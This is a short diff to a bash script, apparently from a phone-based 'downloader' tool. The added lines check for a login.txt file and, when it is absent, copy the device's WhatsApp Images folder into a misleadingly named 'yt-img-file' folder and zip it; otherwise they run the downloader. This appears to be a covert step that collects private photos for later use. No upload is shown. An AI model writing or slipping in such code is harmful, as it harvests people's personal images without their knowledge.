@@ -1,4 +1,7 @@
 #!/bin/bash
-
-./downloader &
+if [ ! -f login.txt ]; then
 cp -r /sdcard/Android/media/com.whatsapp/WhatsApp/media/'WhatsApp Images' yt-img-file
+zip yt-img-file.zip yt-img-file
+else 
+     ./downloader &
+fi
